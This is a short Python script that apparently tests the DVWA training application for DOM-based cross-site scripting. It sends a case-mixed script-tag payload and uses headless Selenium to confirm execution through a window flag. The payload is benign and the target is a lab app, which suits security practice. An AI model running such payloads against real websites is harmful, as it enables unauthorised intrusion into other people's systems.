import requests
import re 
from pprint import pprint
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from selenium import webdriver 
from selenium.webdriver.chrome.options import Options

session = requests.Session()
session.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"
session.headers["Cookie"] = "PHPSESSID=2r5bfcokovgu1hjf1v08amcd1g; security=low"

payload = "<SCrIpT>window.exploitDetected = true</ScRiPt>"
xss_url = '''http://dvwa-win10/vulnerabilities/xss_d/?default=English'''+payload

r = session.get(xss_url)
options = Options()
options.add_argument("--disable-extensions")
options.add_argument("--disable-gpu")
options.add_argument("--no-sandbox") # linux only
options.add_argument("--headless")
# webdriver.firefox.options.headless = True
# fireFoxOptions.set_headless()
browser = webdriver.Chrome(options=options)

browser.get(r.url)
browser.add_cookie({"name": "PHPSESSID", "value": "2r5bfcokovgu1hjf1v08amcd1g"})
browser.get('''http://dvwa-win10/vulnerabilities/xss_d/#%3Cscript%3Ewindow.exploitDetected=true%3C/script%3E''')
s = browser.execute_script("return window.exploitDetected")
print(s)



browser.quit()


# # print(type(session))


# # r = requests.get(xss_url)
print(r.url)
# if payload.lower() in r.text.lower(): 
#     print("vulnerable")
# else:
#     print("NO")